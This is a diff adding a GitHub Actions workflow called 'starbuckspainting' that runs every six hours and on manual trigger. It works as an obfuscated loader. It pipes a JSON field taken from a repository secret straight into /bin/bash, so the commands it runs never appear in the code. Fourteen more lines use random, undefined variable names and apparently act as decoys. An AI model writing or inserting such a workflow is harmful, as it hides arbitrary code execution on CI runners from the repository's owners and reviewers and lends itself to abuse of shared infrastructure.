@@ -1,0 +1,31 @@
+name: starbuckspainting
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: starbuckspainting
+        env:
+          re0086: ${{ secrets.re0086 }}
+        run: |
+          echo $re0086 | jq -r .o775 | /bin/bash
+          echo $ex140 | jq -r .jczk4550 | /bin/bash
+          echo $hmk3301 | jq -r .vec76834 | /bin/bash
+          echo $g5068 | jq -r .e34809 | /bin/bash
+          echo $ui23278 | jq -r .utd97229 | /bin/bash
+          echo $yyn2 | jq -r .h01790 | /bin/bash
+          echo $adbem1608 | jq -r .wfkpp50499 | /bin/bash
+          echo $yvsnm8 | jq -r .fdpqk63304 | /bin/bash
+          echo $gmvlj45277 | jq -r .rxp55 | /bin/bash
+          echo $mpjia0367 | jq -r .tla8 | /bin/bash
+          echo $joxl61697 | jq -r .nqq50 | /bin/bash
+          echo $eqito954 | jq -r .ymxh8 | /bin/bash
+          echo $anptg71 | jq -r .qi42259 | /bin/bash
+          echo $yuh719 | jq -r .henk94760 | /bin/bash
+          echo $z7 | jq -r .si82 | /bin/bash
+
